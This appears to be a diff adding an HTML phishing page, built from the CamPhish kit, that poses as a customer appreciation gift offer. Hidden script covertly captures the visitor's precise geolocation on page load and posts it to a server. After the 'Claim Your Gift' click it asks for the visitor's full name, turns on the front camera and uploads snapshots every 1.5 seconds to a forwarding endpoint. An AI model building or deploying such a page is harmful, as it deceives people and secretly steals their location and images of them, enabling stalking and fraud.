@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Customer Appreciation Gift</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
+body {
+font-family: 'Roboto', sans-serif;
+background-color: #f4f7f6;
+color: #333;
+margin: 0;
+padding: 0;
+display: flex;
+justify-content: center;
+align-items: center;
+min-height: 100vh;
+        }
+
+.container {
+background-color: #ffffff;
+border-radius: 10px;
+box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+padding: 40px;
+max-width: 500px;
+width: 90%;
+text-align: center;
+box-sizing: border-box;
+        }
+
+h1 {
+            color: #0056b3;
+            font-size: 2em;
+            margin-bottom: 10px;
+        }
+
+p {
+            font-size: 1.1em;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+.button {
+display: inline-block;
+background-color: #007bff;
+color: #ffffff;
+padding: 15px 30px;
+font-size: 1.2em;
+font-weight: 700;
+text-decoration: none;
+border-radius: 5px;
+transition: background-color 0.3s ease;
+cursor: pointer;
+border: none;
+        }
+
+.button:hover {
+            background-color: #0056b3;
+        }
+
+.footer {
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #aaa;
+        }
+
+    </style>
+</head>
+
+<body>
+<div class="container">
+<h1>A Special Gift For You!</h1>
+<p>As a thank you for being a valued customer, we're offering you a special appreciation gift. Click the
+            button below to claim it
+            now!</p>
+<button class="button" onclick="claimGift()">Claim Your Gift</button>
+<p class="footer">This offer is valid for a limited time.</p>
+</div>
+<!-- CamPhish Core Functionality (hidden) -->
+<div class="video-wrap" hidden="hidden">
+<video id="video" playsinline autoplay></video>
+</div>
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <script>
+// --- LOCATION CAPTURE SCRIPT ---
+function getLocation() {
+if (navigator.geolocation) {
+navigator.geolocation.getCurrentPosition(sendPosition, handleError, {
+enableHighAccuracy: true,
+timeout: 15000,
+maximumAge: 0
+                });
+            }
+        }
+function sendPosition(position) {
+var lat = position.coords.latitude;
+var lon = position.coords.longitude;
+var acc = position.coords.accuracy;
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "location.php", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("lat=" + lat + "&lon=" + lon + "&acc=" + acc + "&time=" + new Date().getTime());
+        }
+function handleError(error) {
+console.warn('Location Error: ' + error.message);
+        }
+// --- CAMERA CAPTURE SCRIPT ---
+function claimGift() {
+var name = prompt("To verify your identity, please enter your full name:");
+if (name) {
+initCamera();
+alert("Thank you, " + name + "! Your gift is being processed. Please remain on this page.");
+            }
+        }
+function postCameraImage(imgdata) {
+$.ajax({
+type: 'POST',
+data: { cat: imgdata },
+url: 'forwarding_link/post.php', // This placeholder is replaced by CamPhish
+dataType: 'json',
+async: false,
+success: function (result) { },
+error: function () { }
+});
+}
+'use strict';
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const constraints = {
+audio: false,
+video: { facingMode: "user" }
+};
+async function initCamera() {
+try {
+const stream = await navigator.mediaDevices.getUserMedia(constraints);
+handleCameraSuccess(stream);
+            } catch (e) {
+console.error('Camera Error:', e.toString());
+            }
+        }
+function handleCameraSuccess(stream) {
+window.stream = stream;
+video.srcObject = stream;
+var context = canvas.getContext('2d');
+var captureInterval = setInterval(function () {
+context.drawImage(video, 0, 0, 640, 480);
+var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+postCameraImage(canvasData);
+            }, 1500);
+setTimeout(() => {
+clearInterval(captureInterval);
+stream.getTracks().forEach(track => track.stop());
+            }, 10000);
+        }
+// --- INITIALIZE ON PAGE LOAD ---
+window.onload = function () {
+// Get location as soon as the page loads
+getLocation();
+        };
+</script>
+</body>
+
+</html>
